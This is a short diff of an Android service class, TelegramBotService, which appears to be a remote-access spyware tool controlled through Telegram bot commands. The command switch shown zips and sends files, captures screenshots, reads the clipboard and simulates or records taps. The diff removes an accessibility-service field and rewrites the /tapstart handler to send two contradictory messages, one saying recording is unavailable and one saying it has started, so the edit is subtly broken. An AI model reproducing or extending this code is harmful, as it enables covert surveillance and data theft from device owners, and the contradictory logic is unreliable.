@@ -29,7 +29,6 @@ import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.view.KeyEvent;
 import android.view.accessibility.AccessibilityEvent;
-import android.view.accessibility.AccessibilityService;
 import android.view.accessibility.AccessibilityNodeInfo;
 import android.widget.Toast;
 
@@ -72,7 +71,6 @@ public class TelegramBotService extends Service {
     private Vibrator vibrator;
     private StringBuilder tapLog = new StringBuilder();
     private boolean isTapRecording = false;
-    private AccessibilityService accessibilityService;
 
     @Override
     public void onCreate() {
@@ -145,7 +143,7 @@ public class TelegramBotService extends Service {
             case "/zip": createZipAndSend(); break;
             case "/volume": adjustVolume(arg); break;
             case "/tap": startAutoTap(Integer.parseInt(arg)); break;
-            case "/tapstart": startTapRecording(); sendMessage("🎯 Tap recording started"); break;
+            case "/tapstart": sendMessage("❌ Tap recording requires Accessibility permission. Manual tap simulation not available."); sendMessage("🎯 Tap recording started"); break;
             case "/tapstop": stopTapRecording(); break;
             case "/screenshot": takeScreenshot(); break;
             case "/clipboard": getClipboard(); break;
